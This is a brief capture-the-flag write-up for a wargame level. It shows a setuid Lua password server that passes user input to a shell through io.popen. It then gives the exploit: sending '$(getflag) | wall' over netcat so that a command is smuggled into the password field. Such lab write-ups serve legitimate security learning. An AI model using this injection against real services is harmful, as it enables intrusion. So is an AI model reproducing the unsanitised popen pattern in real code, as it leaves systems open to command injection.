# Flag 11

```bash
$ ll
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout*
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua*
-r-x------  1 level11 level11  675 Apr  3  2012 .profile*
```

We have a Lua program which is a server listening for password, but to get the hash of the password it does something a bit weird.

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

So maybe we connect to server and send a password which contains getflag we maybe can execute it. And the command we find is:

```bash
$ nc localhost 5151
Password: $(getflag) | wall
```
